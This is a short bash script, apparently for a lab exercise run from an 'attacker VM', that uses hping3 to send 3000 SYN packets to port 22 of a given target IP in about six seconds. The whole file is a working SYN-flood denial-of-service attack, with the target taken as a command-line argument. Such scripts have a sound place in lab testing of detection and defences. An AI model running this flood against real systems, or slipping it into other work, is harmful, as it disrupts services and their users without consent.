#!/usr/bin/env bash
# Run on the ATTACKER VM:   bash attack_flood.sh 192.168.56.103
# A SYN flood: 3000 connection attempts to the SSH port in about 6 seconds, never completed.
TARGET="${1:?usage: bash attack_flood.sh TARGET_IP}"
echo "Sending 3000 SYN packets to $TARGET:22 ..."
sudo hping3 -S -p 22 -i u2000 -c 3000 "$TARGET"
